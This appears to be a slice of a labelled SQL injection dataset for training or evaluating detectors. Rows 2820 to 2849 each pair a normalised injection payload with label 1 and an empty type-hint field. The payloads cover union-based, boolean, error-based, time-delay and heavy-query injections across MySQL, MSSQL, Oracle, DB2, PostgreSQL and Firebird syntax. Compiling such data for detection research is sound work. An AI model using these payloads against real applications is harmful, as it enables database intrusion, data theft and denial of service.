row_index,payload_norm,label,sqli_type_hint
2820,"-9860 ) where 8743 = 8743 union all select 8743,8743,8743,8743,8743,8743,8743--",1,
2821,"1"" ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ""rkvr"" = ""rkvr",1,
2822,"1"" ) ) as nwnp where 6140 = 6140",1,
2823,"1 ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
2824,-3861' ) as zmja where 4036 = 4036 or 9323 = 9323#,1,
2825,"-1305 ) or make_set ( 2298 = 5545,5545 ) and ( 6715 = 6715",1,
2826,1'+ ( select dpkp where 4836 = 4836 and sleep ( 5 ) ) +',1,
2827,"-1631%"" ) or elt ( 8285 = 1709,1709 ) and ( ""%"" = """,1,
2828,waitfor delay '0:0:5'--,1,
2829,select ( case when ( 9299 = 2760 ) then 1 else 9299* ( select 9299 from master..sysdatabases ) end ) --,1,
2830,1'|| ( select 'brsr' where 5458 = 5458,1,
2831,"select count ( * ) from generate_series ( 1,5000000 ) and ( ""%"" = """,1,
2832,"iif ( 8214 = 4954,1,1/0 )",1,
2833,"1'+ ( select 'zkuf' where 3591 = 3591 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",1,
2834,1 ) ) and 2006 = 2006,1,
2835,1'+ ( select 'uqaf' where 7414 = 7414,1,
2836,"1"" where 9889 = 9889",1,
2837,"1%"" or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
2838,"1' ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'dqjq' = 'dqjq",1,
2839,"1%' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and '%' = '",1,
2840,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( '%' = '",1,
2841,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 'dqoz' like 'dqoz,1,
2842,1 ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 1601 = 1601,1,
2843,"-4166%"" ) union all select 5190--",1,
2844,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( '%' = '",1,
2845,"1%"" ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
2846,"1' ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'nopu' = 'nopu",1,
2847,"1' ) ) as rxhe where 3838 = 3838 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
2848,"1"" ) ) as hdyn where 6027 = 6027 union all select null,null,null--",1,
2849,"1' ) as wnyl where 8978 = 8978 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
